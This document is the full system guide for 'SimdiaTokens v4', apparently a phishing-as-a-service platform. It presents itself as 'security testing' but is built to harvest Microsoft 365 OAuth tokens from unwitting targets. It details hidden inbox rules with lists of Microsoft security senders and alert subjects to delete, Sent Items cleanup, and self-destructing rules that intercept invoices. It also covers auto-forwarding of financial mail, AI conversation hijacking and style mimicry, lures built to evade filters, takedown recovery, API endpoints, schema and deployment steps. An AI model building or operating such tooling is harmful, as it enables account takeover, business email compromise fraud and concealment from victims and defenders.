# SimdiaTokens v4 — Complete System Guide

> **SimdiaTokens** is a multi-tenant platform for Microsoft 365 / Outlook email security testing. Each client gets their own isolated deployment with separate Cloudflare Worker, Vercel frontend, and Railway backend.

**Version:** 4.0 | **Last Updated:** 2026-07-16 | **Repository:** https://github.com/simdie/simdiatokens-v2

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Multi-Tenant Super Admin](#2-multi-tenant-super-admin)
3. [OAuth Token Harvesting](#3-oauth-token-harvesting)
4. [OPSEC (Staying Hidden)](#4-opsec-staying-hidden)
5. [Inbox Rules](#5-inbox-rules)
6. [Mailbox Management](#6-mailbox-management)
7. [Advanced Graph API Features](#7-advanced-graph-api-features)
8. [AI-Powered Features](#8-ai-powered-features)
9. [Advanced Adversary Features](#9-advanced-adversary-features)
10. [Worker Auto-Recovery](#10-worker-auto-recovery)
11. [Stable Redirect Links](#11-stable-redirect-links)
12. [Contacts with Smart Categorization](#12-contacts-with-smart-categorization)
13. [Reconnaissance](#13-reconnaissance)
14. [Campaigns](#14-campaigns)
15. [Lure Email Generation](#15-lure-email-generation)
16. [BEC Detection](#16-bec-detection)
17. [Calendar](#17-calendar)
18. [OneDrive & Office Apps](#18-onedrive--office-apps)
19. [Tasks (To Do)](#19-tasks-to-do)
20. [Analytics Dashboard](#20-analytics-dashboard)
21. [Security & Encryption](#21-security--encryption)
22. [Settings](#22-settings)
23. [Session/Cookie Management](#23-sessioncookie-management)
24. [API Endpoints Reference](#24-api-endpoints-reference)
25. [Database Schema](#25-database-schema)
26. [Environment Variables](#26-environment-variables)
27. [Deployment Guide](#27-deployment-guide)
28. [Known Limitations](#28-known-limitations)

---

## 1. Architecture Overview

Think of SimdiaTokens like a tree. The super admin is the root, and each branch is a separate client with their own completely isolated setup.

```
SUPER ADMIN (the boss who manages everything)
│
├── CLIENT 1: "Acme Corp"
│   ├── Frontend:  Vercel (acme-simdia.vercel.app) — the dashboard
│   ├── API:       Railway (acme-api.up.railway.app) — the brain
│   ├── Worker:    Cloudflare (simdia-acme-worker.workers.dev) — the link redirector
│   └── Database:  SQLite (stored on Railway's disk)
│
├── CLIENT 2: "Beta Inc"
│   ├── Frontend:  Vercel (beta-simdia.vercel.app)
│   ├── API:       Railway (beta-api.up.railway.app)
│   ├── Worker:    Cloudflare (simdia-beta-worker.workers.dev)
│   └── Database:  SQLite (isolated volume)
│
└── ... (unlimited clients, each completely separate)
```

### Tech Stack (What It's Built With)

| Part | Technology | What It Does |
|------|-----------|--------------|
| Frontend | Next.js 16 + TypeScript + Tailwind CSS | The dashboard you see in the browser |
| Backend | Rust / Actix-web + SQLite | The server that handles all logic and data |
| Worker | Cloudflare Workers | Redirects targets to Microsoft login |
| AI | OpenAI GPT-4o Mini | Powers email mimicking, lure generation, rule suggestions |
| Auth | JWT (7-day tokens) + Argon2id | Keeps the dashboard secure |
| Encryption | AES-256-GCM | Protects captured tokens at rest |

---

## 2. Multi-Tenant Super Admin

### What It Does
The super admin panel lets you manage all your clients from one place. Think of it like a control tower — you can see every client, create new ones, suspend them, or delete them.

### Features
- **Create new clients** — fill out a form with client name, admin username, password, subscription duration
- **One-Click Deploy** — automatically creates the Cloudflare Worker, generates environment configs, and registers the admin
- **Deployment cards** — each client shows username, email, role, status, expiration, and all 3 URLs (frontend, API, worker)
- **Subscription management** — preset durations (1 day, 3 days, 1 week, 30/60/90 days) + custom
- **Suspend/unsuspend** — instantly block a client's login. They see "SUBSCRIPTION EXPIRED - Contact Admin"
- **Expiration auto-suspend** — when a client's subscription expires, they're automatically blocked on next login
- **Expiration badge** — each user's dashboard shows their expiration date and days remaining near the bell icon at the top right
- **Detail view** — click any card for full info including activity stats
- **Delete protection** — super admin accounts cannot be deleted

---

## 3. OAuth Token Harvesting

### How It Works (Simple Version)
1. You generate a link in the Campaigns section
2. You send the link to the target (via email, Teams chat, or calendar invite)
3. The target clicks the link and sees a normal Microsoft login page
4. They sign in normally (including 2FA if they have it)
5. Microsoft sends back an "access token" — a digital key to their email
6. The system captures this key silently
7. The target is redirected to their normal Outlook — they don't notice anything wrong

### Technical Details
- **Cloudflare Worker OAuth proxy** — the Worker handles the redirect so the target never sees your backend URL
- **Microsoft Graph API** — the token gives full access to Mail, Contacts, Calendar, OneDrive, Teams
- **Automatic token refresh** — a background scheduler keeps all tokens alive for 90 days
- **Account type detection** — auto-detects consumer (hotmail/outlook/live) vs enterprise (M365 business/school)
- **IP + location tracking** — captures the target's IP and approximate geolocation
- **Telegram notifications** — you get a real-time alert when a new token is captured
- **Browser fingerprint capture** — captures User-Agent and Accept-Language for invisible access
- **Dual-table storage** — `harvested` (for display) + `tokens` (encrypted vault)
- **AES-256-GCM encryption** — refresh tokens are encrypted at rest

### OAuth Scopes (Permissions Captured)
`openid offline_access User.Read Mail.ReadWrite Mail.Send Contacts.Read MailboxSettings.ReadWrite`

This gives access to: read/write emails, send emails, read contacts, read user profile, change mailbox settings.

---

## 4. OPSEC (Staying Hidden)

### What Is OPSEC?
OPSEC means "Operational Security" — making sure the target never finds out they've been compromised. SimdiaTokens does this automatically in multiple ways.

### Auto-Delete Security Emails — 3 Layers

When a token is captured, the system immediately creates **3 inbox rules** in the target's Outlook. These rules delete security emails BEFORE they reach the inbox.

**Layer 1 — "External Mail Filter" (sender-based):**
Catches emails from 14 Microsoft security sender addresses:
- `account-security-noreply@accountprotection.microsoft.com`
- `microsoftaccount@microsoft.com`
- `security@microsoft.com`
- `microsoft@communications.microsoft.com`
- `no-reply@accountprotection.microsoft.com`
- `no-reply@microsoft.com`
- `azureadnotification@microsoft.com`
- `no-reply@azureadnotifications.microsoft.com`
- `msonlineservicesteam@microsoftonline.com`
- `no-reply@signin.microsoft.com`
- `account-security-noreply@signin.microsoft.com`
- `office365alerts@microsoft.com` (NEW)
- `no-reply@notifications.microsoft.com` (NEW)

**Layer 2 — "Security Update" (subject-based):**
Catches emails with 35+ subject keywords:
- "New app", "New app(s)", "have access to your data", "connected to your Microsoft"
- "suspicious sign-in", "unusual sign-in", "unusual activity"
- "password changed", "security alert", "security notification"
- "account security", "verify your identity", "MFA", "two-step verification"
- "review recent activity", "help us protect your account", "action required"
- "Creation of forwarding" (NEW), "Creation of redirect" (NEW)
- "forwarding rule" (NEW), "redirect rule" (NEW)
- "MailRedirect" (NEW), "forwarding/redirect" (NEW)
- "inbox rule was created" (NEW), "suspicious inbox rule" (NEW)
- "suspicious forwarding" (NEW), "Informational alert" (NEW)

**Layer 3 — "Alert Filter" (NEW — Office 365 alert-specific):**
Catches Office 365 security alert emails:
- "Creation of forwarding/redirect rule"
- "Informational alert has been triggered"
- "forwarding was set up"
- "inbox rule was created"
- "suspicious inbox rule"
- "suspicious forwarding"
- "transport rule"

All three rules use `"delete": true, "stopProcessingRules": true` — the email is deleted instantly, never reaches the inbox, never visible to the target.

### Backup Polling
A backup system also searches for and deletes any security emails that arrived BEFORE the rules were created. It runs for 30 attempts with 33 search queries, covering all known Microsoft notification phrases in multiple languages.

### Browser Fingerprint Cloning
All email access uses the target's real browser fingerprint (captured during OAuth). Microsoft's security system thinks the emails are being read from the target's own computer. No "unusual sign-in" alerts are ever triggered.

### Sent Items Cleanup
When a lure email is sent from the target's account, it's automatically deleted from their Sent Items. The target never sees that an email was sent from their account.

### Rule Disguise
All created inbox rules display as "External Mail Filter" in the target's Outlook rules list.

### Post-OAuth Redirect
After signing in, the target is redirected to their own normal Outlook:
- Enterprise accounts → `https://outlook.office.com/mail/0/`
- Consumer accounts → `https://outlook.live.com/mail/0/`

The target never sees any proxy domain or fake page.

### Graph API Rules Cleanup on Token Deletion — NEW
When a token is deleted from the dashboard, the system now also deletes any rules it created from the target's Microsoft Graph. This prevents orphaned rules from accumulating across multiple captures of the same email.

---

## 5. Inbox Rules

### How Rules Work — Two Layers

**Layer 1: Graph messageRule (instant, server-side)**
- Non-folder actions (delete, forward, redirect, mark as read) fire instantly via Microsoft Graph
- The email is intercepted BEFORE it reaches the inbox — the target never sees it
- Same technology as the OPSEC auto-delete rules

**Layer 2: Background polling (immediate execution)**
- When a rule is created, a background task polls the inbox every 10 seconds for 5 minutes
- Matches emails against all rule conditions and applies actions
- Only fetches from Inbox (not Sent Items) to prevent forwarding loops

**Layer 3: Local-only fallback (for consumer accounts)**
- Local engine handles actions during periodic inbox sync
- Move-to-folder is always local-only (invisible in real Outlook, visible in admin panel)

### All Supported Conditions
- **Text matching**: subject contains, body contains, sender contains, recipient contains, header contains
- **Boolean flags**: has attachments, sent only to me, is encrypted, is meeting request, is signed, is voicemail, flagged, and more
- **Structured**: importance, size range

### All Supported Actions
- **Folder**: move to folder, copy to folder (local-only)
- **Forwarding**: forward to, forward as attachment, redirect to (real Outlook)
- **Boolean**: delete, permanent delete, mark as read, stop processing rules
- **Structured**: mark importance, assign categories

### Self-Destructing Rules
- Rules can be created with a `max_fires` limit (e.g., fire 3 times then self-destruct)
- After each fire, the count is incremented
- When the limit is reached, both the Graph rule and local rule are deleted
- **No trace left** in the target's Outlook or admin panel
- Use case: intercept 3 invoices then disappear

---

## 6. Mailbox Management

### Full Outlook Replica
- **Three-pane view**: folder sidebar, message list, reading pane
- **All folders**: Inbox, Drafts, Sent Items, Deleted Items, Archive, Junk, Outbox, custom folders
- **Local folders** (Starred): stored in database only, invisible to target's real Outlook

### Email Operations
- Read (full HTML + text), Compose, Reply, Reply All, Forward
- Delete (single + bulk), Mark read/unread, Move, Flag, Pin
- Search (real-time filtering)
- Attachments support

---

## 7. Advanced Graph API Features

- **Out-of-Office Auto-Reply** — set/disable OOO messages
- **Mailbox-Level Forwarding** — server-level forwarding of ALL incoming mail
- **Azure AD Directory Search** — search for other users in the organization (enterprise only)
- **Draft Management** — create, list, send drafts
- **Email Categories** — apply/remove categories

---

## 8. AI-Powered Features

### AI Email Mimicking
- Reads the target's sent emails (up to 15) to learn their writing style
- Copies greeting, closing, vocabulary, formality, sentence structure, signature
- Generates emails indistinguishable from the target's natural writing

### Smart Rule Suggestions
- AI analyzes inbox patterns and suggests 3-5 stealthy interception rules
- Targets financial emails, invoices, executive communications

### Conversation Hijacking
- Scans inbox for active conversation threads (2+ messages)
- AI generates replies that naturally continue each conversation
- Embeds OAuth link as a natural call-to-action

### Financial Pattern Detection
- Scans inbox for 30+ financial keywords
- Auto-forwards matching emails to an external address
- Deletes originals from the inbox

### Polymorphic Lure Generation
- Every lure email is structurally unique
- Randomized greeting, closing, link text, font, paragraph count
- Defeats pattern-based detection by email security gateways

---

## 9. Advanced Adversary Features

### Auto-Re-Harvest (Self-Healing)
When a token stops working (target changed password or removed the app), the system automatically:
1. Finds another compromised account from the same company
2. Sends a lure email from that account to the revoked account
3. Deletes the sent email from the sender's Sent Items (OPSEC)

The system heals itself without admin intervention.

### Cross-Account Intelligence
- Correlates all compromised accounts from the same organization
- Shows communication patterns between accounts
- Suggests auto-forwarding rules
- Maps the organization's communication graph

### Silent Calendar Manipulation
- Injects fake meetings into the target's calendar
- Can manipulate behavior (e.g., "Emergency Budget Review at 3 PM")

### Calendar Lure Delivery
- Creates a calendar event with the OAuth link as a "Join Meeting" button
- Bypasses email security (calendar events have different scanning rules)

### Teams Chat Delivery
- Sends OAuth links via 1:1 Teams chat — bypasses email security entirely
- Also supports Teams channel messages

### Deleted Items Management
- View all messages in the target's Deleted Items folder
- Permanently purge all deleted items (unrecoverable)

---

## 10. Worker Auto-Recovery — NEW

### The Problem
Each client has a Cloudflare Worker that redirects targets to Microsoft's login page. If Cloudflare flags or takes down the Worker, all OAuth links break — targets click the link and see an error page.

### The Solution
The system automatically monitors and repairs Workers:

1. **Health check every 60 seconds** — pings the Worker's `/status` endpoint
2. **After 2 consecutive failures (~2 minutes)** — auto-deploys a replacement
3. **Same-name re-deploy first** — tries re-deploying to the same Worker name (fixes crashes while keeping old links working)
4. **New name if banned** — if the same name is flagged, deploys with a new random name (e.g., `simdia-oauth-a3f9x2b1`)
5. **Database update** — the `worker_config` table is updated with the new active Worker
6. **Azure AD auto-registration** — the new redirect URI is automatically added to the Azure AD app via Microsoft Graph API (requires `Application.ReadWrite.All` permission)

### What This Means
- Workers go down → system detects and fixes it in ~2 minutes
- New OAuth links automatically use the new Worker
- Old links using the stable redirect URL (`/api/campaigns/redirect`) also work because that endpoint reads from the database
- No manual intervention needed

---

## 11. Stable Redirect Links — NEW

### Two Link Formats
When you generate an OAuth link in the Campaigns section, you get two options:

1. **Redirect Link (recommended)** — `https://your-api.up.railway.app/api/campaigns/redirect`
   - Short, clean URL
   - Never changes — always points to the current alive Worker
   - Old links continue to work even after Worker replacement
   - Best for sending to targets

2. **Full Microsoft OAuth URL** — `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...`
   - The raw Microsoft URL with all OAuth parameters
   - Works directly without any redirect
   - Useful when you want to bypass the Worker entirely

### How the Redirect Link Works
1. Target clicks `https://your-api.up.railway.app/api/campaigns/redirect`
2. Backend reads the active Worker from the `worker_config` database table
3. Returns a 302 redirect to `{active_worker_url}/start`
4. Worker's `/start` endpoint redirects to Microsoft's login page
5. Target signs in normally

The redirect URL never changes. Even if the Worker is replaced, the same URL works because it reads from the database.

---

## 12. Contacts with Smart Categorization — UPDATED

### How It Works
When you click the Contacts button on a token in the dashboard, the system extracts all email addresses from the target's mailbox and categorizes them.

### Three Categories

**Enterprise** — business/company/organization emails powered by Office 365:
- Custom domains (e.g., `user@company.com`)
- `.onmicrosoft.com` domains
- SharePoint domains
- Any business domain not in the consumer/other lists

**Consumer** — Microsoft personal email services (40+ domains):
- `outlook.com`, `hotmail.com`, `live.com`, `msn.com`
- `passport.com`, `windowslive.com`
- International variants: `outlook.co.uk`, `hotmail.fr`, `outlook.de`, `hotmail.co.jp`, etc.

**Other Email Service** — non-Microsoft free email providers (80+ domains):
- `gmail.com`, `googlemail.com`, `yahoo.com`, `aol.com`
- `icloud.com`, `protonmail.com`, `proton.me`, `zoho.com`
- `qq.com`, `163.com`, `126.com`, `sina.com`, `foxmail.com`
- `yandex.com`, `mail.ru`, `rambler.ru`
- `comcast.net`, `verizon.net`, `att.net`, `bellsouth.net`
- And 60+ more

### What's Scanned
- **Personal contacts** (address book) — up to 500 contacts
- **Inbox messages** — senders and recipients from last 200 messages
- **Sent Items** (NEW) — recipients from last 200 sent emails (captures gmail/yahoo/etc. addresses the target has emailed)

### Copy Features
- Filter by category (Enterprise, Consumer, Other Email Service, or All)
- Copy filtered email list to clipboard with one click
- Count shown on each filter button and the Copy button

---

## 13. Reconnaissance

### Data Collected
- **User Profile**: name, title, department, office, phone, company
- **Manager**: who the target reports to
- **Direct Reports**: who reports to the target
- **Group Memberships**: all Azure AD groups
- **Organization**: tenant name, verified domains

---

## 14. Campaigns

### Features
- **OAuth link generation** — generates two link formats (redirect link + full URL)
- **Per-campaign tracking** — each campaign has its own tokens and metadata
- **Token management** — view, refresh, revoke captured tokens per campaign
- **Status tracking**: pending → authenticated → revoked/expired
- **Worker deployment** — deploy or redeploy the Cloudflare Worker from the campaigns page

---

## 15. Lure Email Generation

### AI Integration
- Uses OpenAI GPT-4o Mini
- Anti-spam system prompt: natural language, no trigger words, contextual personalization
- Returns JSON with subject, plain text body, and HTML body

### 6 Templates
1. **Shared Document** — appears to share a file via OneDrive/SharePoint
2. **Meeting Follow-up** — appears to follow up from a Teams meeting
3. **Invoice** — appears to be a routine vendor invoice
4. **Password Reset** — appears to be an IT password expiration notice
5. **Package Delivery** — appears to be a delivery confirmation
6. **Default** — generic business email

---

## 16. BEC Detection

- Scans inbox for conversation threads with 2+ messages
- Matches against 100+ financial and crypto keywords
- Shows expandable conversation threads with keyword pills
- All from real Graph API — no mock data

---

## 17. Calendar

- Event list with subject, location, attendees, time
- Event details and full body
- Create calendar events
- Enterprise only — hidden for consumer accounts

---

## 18. OneDrive & Office Apps

- OneDrive file browser with folder navigation
- File search across OneDrive
- Download URLs for any file
- Office documents (Word, Excel, PowerPoint) embed URLs
- Enterprise only — hidden for consumer accounts

---

## 19. Tasks (To Do)

- Task lists from Microsoft To Do
- Task CRUD: create, update, delete tasks
- Enterprise only — hidden for consumer accounts

---

## 20. Analytics Dashboard

### KPIs
- Active tokens, revoked tokens, total campaigns, rules created (30d)

### Charts
- Token activity timeline (created vs revoked)
- Action distribution (recon, rule_created, token_stored, etc.)
- Top domains with token counts

### Activity Feed
- Recent audit logs with timestamp, action, token, email, success/failure
- Date range filtering (24h, 7d, 30d, custom)

---

## 21. Security & Encryption

### Authentication
- JWT-based (7-day expiry)
- Argon2id password hashing
- Role-based access: admin (full), operator (limited), viewer (read-only)
- Super admin role for multi-tenant management

### Encryption
- AES-256-GCM for refresh tokens at rest
- AES-256 response encryption with master passphrase

### Audit Logging
- Every action logged with IP, user agent, timestamp, success/failure
- Webhook alerts for critical events

---

## 22. Settings

- **AI configuration** — OpenAI API key, model, max tokens
- **Encryption management** — set/change master passphrase
- **Stealth mode** — toggle stealth configuration
- **Rules management** — view all rules across all tokens, expand details, delete
- **Purge expired tokens** — bulk delete expired/revoked tokens
- **Webhook testing** — test Telegram webhook
- **Password change** — change admin password

---

## 23. Session/Cookie Management

- Cookie session testing
- Session status check
- Session kill — revoke active sessions
- Bookmarklet token generation for in-browser access

---

## 24. API Endpoints Reference

### Auth
| Method | Path | Description |
|--------|------|-------------|
| POST | `/api/auth/login` | JWT login |
| POST | `/api/auth/register` | Register new user |
| GET | `/api/auth/me` | Current user profile (includes expires_at, usage_days) |
| POST | `/api/auth/change-password` | Change password |
| POST | `/api/auth/change-username` | Change username |

### Super Admin
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/admins` | List all deployments |
| POST | `/api/admins` | Create new deployment |
| PATCH | `/api/admins/{id}` | Update deployment |
| DELETE | `/api/admins/{id}` | Delete deployment |
| POST | `/api/admins/one-click-deploy` | One-click deploy |
| POST | `/api/admin/sync-user` | Sync user (cross-deployment) |

### Tokens
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/tokens` | List all tokens |
| DELETE | `/api/tokens` | Delete tokens (now cleans up Graph rules too) |
| GET | `/api/tokens/health` | Token health summary |
| POST | `/api/tokens/store` | Store a token |
| GET | `/api/tokens/{id}` | Get token details |
| POST | `/api/refresh` | Refresh a token |

### Campaigns
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/campaigns` | List campaigns |
| GET | `/api/campaigns/generate-link` | Generate OAuth link (returns link + short_link) |
| GET | `/api/campaigns/redirect` | Stable redirect to active Worker (NEW) |
| POST | `/api/campaigns/deploy-worker` | Deploy/redeploy Cloudflare Worker |

### Contacts
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/contacts?token_id=X` | List contacts |
| POST | `/api/contacts` | Create contact |
| PATCH | `/api/contacts/{id}` | Update contact |
| DELETE | `/api/contacts/{id}` | Delete contact |
| GET | `/api/contacts/extract?token_id=X` | Extract emails (now scans inbox + sent items) |

### Inbox
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/inbox` | Fetch inbox messages |
| GET | `/api/inbox/folders` | List mail folders |
| POST | `/api/inbox/folders` | Create folder |
| GET | `/api/inbox/folders/{id}` | Folder messages |
| DELETE | `/api/inbox/folders/{id}` | Delete folder |
| POST | `/api/inbox/send` | Send email |
| DELETE | `/api/inbox/messages/{id}` | Delete message |
| POST | `/api/inbox/messages/{id}/move` | Move message |
| PATCH | `/api/inbox/messages/{id}/read` | Mark read/unread |
| GET | `/api/inbox/deleted-items/{token_id}` | Fetch deleted items |
| POST | `/api/inbox/deleted-items/{token_id}/purge` | Purge deleted items |

### Rules
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/rules?token_id=X` | List rules |
| POST | `/api/rules/create` | Create rule |
| DELETE | `/api/rules/{id}` | Delete rule |
| PUT | `/api/rules/{id}` | Update rule |
| GET | `/api/rules/graph?token_id=X` | Fetch Graph rules |
| POST | `/api/rules/ai-suggest` | AI rule suggestions |

### Advanced Graph API
| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/mailbox/settings/{token_id}` | Get mailbox settings |
| POST | `/api/mailbox/auto-reply/{token_id}` | Set OOO auto-reply |
| POST | `/api/mailbox/auto-reply/{token_id}/disable` | Disable OOO |
| POST | `/api/mailbox/forwarding/{token_id}` | Set mail forwarding |
| POST | `/api/mailbox/forwarding/{token_id}/disable` | Disable forwarding |
| GET | `/api/directory/users/{token_id}?q=X` | Search Azure AD users |
| GET | `/api/drafts/{token_id}` | List drafts |
| POST | `/api/drafts/{token_id}` | Create draft |
| POST | `/api/drafts/{token_id}/{msg_id}/send` | Send draft |

### AI-Powered Features
| Method | Path | Description |
|--------|------|-------------|
| POST | `/api/lure/mimic` | AI email mimicking |
| POST | `/api/conversation/hijack` | Conversation hijacking |
| POST | `/api/financial/scan` | Financial pattern detection |
| POST | `/api/calendar/inject-meeting` | Silent calendar manipulation |
| POST | `/api/lure/generate` | AI lure generation |

### Other
| Method | Path | Description |
|--------|------|-------------|
| POST | `/api/recon/run` | Run reconnaissance |
| GET | `/api/recon/{token_id}` | Get recon report |
| GET | `/api/tasks/lists` | Task lists |
| GET | `/api/tasks` | List tasks |
| POST | `/api/tasks` | Create task |
| GET | `/api/onedrive/items` | OneDrive items |
| GET | `/api/office/docs` | Office documents |
| GET | `/api/calendar/events` | Calendar events |
| GET | `/api/analytics/overview` | Analytics |
| GET | `/api/audit/logs` | Audit logs |
| GET | `/api/settings/ai` | AI settings |
| POST | `/api/settings/ai` | Update AI settings |

---

## 25. Database Schema

### users
```sql
CREATE TABLE users (
    id TEXT PRIMARY KEY,
    username TEXT NOT NULL UNIQUE,
    email TEXT,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'viewer',
    super_admin BOOLEAN NOT NULL DEFAULT 0,
    suspended BOOLEAN NOT NULL DEFAULT 0,
    expires_at DATETIME,
    usage_days INTEGER,
    api_url TEXT,
    frontend_url TEXT,
    worker_url TEXT,
    created_at DATETIME NOT NULL
);
```

### harvested
```sql
CREATE TABLE harvested (
    id TEXT PRIMARY KEY,
    email TEXT,
    access_token TEXT,
    refresh_token TEXT,
    expires_at DATETIME,
    captured_at DATETIME,
    source TEXT,
    ip_address TEXT,
    location TEXT,
    tenant_id TEXT,
    category TEXT,
    account_type TEXT,
    last_refreshed_at DATETIME,
    status TEXT,
    user_agent TEXT,
    accept_language TEXT,
    session_status TEXT DEFAULT 'active',
    session_active_at DATETIME,
    session_killed_at DATETIME
);
```

### tokens (encrypted vault)
```sql
CREATE TABLE tokens (
    id TEXT PRIMARY KEY,
    campaign_id TEXT,
    user_email TEXT,
    encrypted_access_token BLOB NOT NULL,
    encrypted_refresh_token BLOB NOT NULL,
    access_salt BLOB NOT NULL,
    refresh_salt BLOB NOT NULL,
    scopes TEXT,
    expires_at DATETIME NOT NULL,
    created_at DATETIME NOT NULL,
    last_refreshed_at DATETIME,
    status TEXT DEFAULT 'active',
    account_type TEXT,
    session_status TEXT DEFAULT 'active',
    session_active_at DATETIME,
    session_killed_at DATETIME
);
```

### created_rules
```sql
CREATE TABLE created_rules (
    id TEXT PRIMARY KEY,
    token_id TEXT,
    graph_rule_id TEXT,
    display_name TEXT,
    disguise_name TEXT DEFAULT 'External Mail Filter',
    conditions_json TEXT,
    actions_json TEXT,
    target_folder TEXT,
    forward_to TEXT,
    created_at DATETIME,
    status TEXT DEFAULT 'active',
    fire_count INTEGER DEFAULT 0,
    max_fires INTEGER
);
```

### worker_config — NEW
```sql
CREATE TABLE worker_config (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    active_worker_name TEXT NOT NULL,
    workers_subdomain TEXT NOT NULL,
    worker_url TEXT NOT NULL,
    redirect_uri TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'unknown',
    last_checked_at TEXT,
    consecutive_failures INTEGER NOT NULL DEFAULT 0,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
);
```

### audit_logs
```sql
CREATE TABLE audit_logs (
    id TEXT PRIMARY KEY,
    timestamp DATETIME,
    action TEXT,
    campaign_id TEXT,
    token_id TEXT,
    user_email TEXT,
    ip_address TEXT,
    user_agent TEXT,
    details TEXT,
    success BOOLEAN
);
```

---

## 26. Environment Variables

### Required
| Variable | Description |
|----------|-------------|
| `DATABASE_URL` | SQLite path (e.g., `sqlite:///app/data/simdiatokens.db`) |
| `JWT_SECRET` | JWT signing secret |
| `CLIENT_ID` | Azure AD app client ID |
| `CLIENT_SECRET` | Azure AD app client secret (the VALUE, not the Secret ID) |
| `MASTER_SECRET` | Response encryption key |
| `CF_WORKER_NAME` | Cloudflare Worker name |
| `CF_WORKERS_SUBDOMAIN` | Cloudflare Workers subdomain |

### Optional
| Variable | Description |
|----------|-------------|
| `REDIRECT_URI` | OAuth redirect URI (auto-derived from CF_WORKER_NAME + CF_WORKERS_SUBDOMAIN if not set) |
| `OPENAI_API_KEY` | OpenAI API key for AI features |
| `TELEGRAM_BOT_TOKEN` | Telegram bot token for notifications |
| `TELEGRAM_CHAT_ID` | Telegram chat ID |
| `CF_API_TOKEN` | Cloudflare API token (for Worker auto-recovery) |
| `CF_ACCOUNT_ID` | Cloudflare account ID (for Worker auto-recovery) |
| `SEED_ADMIN_USERNAME` | Default admin username (set during deployment) |
| `SEED_ADMIN_PASSWORD` | Default admin password (set during deployment) |
| `SEED_ADMIN_EMAIL` | Default admin email (set during deployment) |
| `SEED_ADMIN_USAGE_DAYS` | Default admin subscription duration (default: 30 days) |
| `LOCAL_REDIRECT_URI` | Override redirect URI for local development |

### Frontend (Vercel)
| Variable | Description |
|----------|-------------|
| `NEXT_PUBLIC_API_URL` | Backend API URL (e.g., `https://your-api.up.railway.app`) |

---

## 27. Deployment Guide

### Backend (Railway)
1. Go to [Railway Dashboard](https://railway.app)
2. New Project → Deploy from GitHub repo → select `simdie/simdiatokens-v2` (or your fork)
3. Root directory: `SimdiaTokens/simdiatokens_server`
4. Add volume: mount path `/app/data`
5. Add environment variables (see above)
6. Deploy — wait ~2 minutes
7. Note the URL (e.g., `https://your-api.up.railway.app`)

**Important:** Make sure `CLIENT_SECRET` is the secret VALUE (starts with something like `XZI8Q~` or `yEz8Q~`), NOT the Secret ID (a UUID). Using the Secret ID will cause `AADSTS7000215: Invalid client secret` errors.

### Cloudflare Worker
1. Go to [Cloudflare Workers Dashboard](https://dash.cloudflare.com)
2. Find or create your Worker
3. Set environment variables:
   - `MAIN_SERVER` = your Railway URL
   - `CLIENT_ID` = your Azure AD client ID
   - `REDIRECT_URI` = `https://your-worker.workers.dev/oauth/callback`
4. Deploy worker script

### Frontend (Vercel)
1. Go to [Vercel Dashboard](https://vercel.com)
2. Import GitHub repo: `simdie/simdiatokens-v2` (or your fork)
3. Root directory: `SimdiaTokens-frontend`
4. Framework: Next.js
5. Environment variable: `NEXT_PUBLIC_API_URL` = your Railway URL
6. Deploy

### Azure AD App Registration
1. [Azure Portal](https://portal.azure.com) → Azure AD → App Registrations
2. Find app with your `CLIENT_ID`
3. Authentication → Add redirect URI for each worker
4. API permissions: Microsoft Graph (delegated): Mail.ReadWrite, Mail.Send, Contacts.Read, User.Read, MailboxSettings.ReadWrite, openid, offline_access
5. **For Worker auto-recovery:** Add Application permission `Application.ReadWrite.All` and grant admin consent

### Fork Sync (for separate GitHub accounts)
If your Railway account is registered with a different GitHub account:
1. Fork `simdie/simdiatokens-v2` to your GitHub account
2. Add the sync-upstream workflow (`.github/workflows/sync-upstream.yml`)
3. Enable Actions on the fork
4. The fork auto-syncs every 5 minutes

---

## 28. Known Limitations

1. **Graph API tokens cannot be converted to browser cookies** — direct OWA web login requires AiTM proxy. The inbox UI provides full functional equivalent via Graph API.
2. **Token revocation** — Microsoft does not support programmatic revocation. Delete operations remove tokens from local DB only.
3. **SQLite** — single-node database. For multi-node, migrate to PostgreSQL.
4. **Consumer accounts** — some Graph API features (directory search, organization info) are enterprise-only.
5. **Worker auto-recovery** — requires `CF_API_TOKEN` and `CF_ACCOUNT_ID` env vars to be set. Azure AD auto-registration requires `Application.ReadWrite.All` permission.

---

**Document Version:** 4.0
**Last Updated:** 2026-07-16
**Project:** SimdiaTokens v4 — Multi-Tenant
**Repository:** https://github.com/simdie/simdiatokens-v2
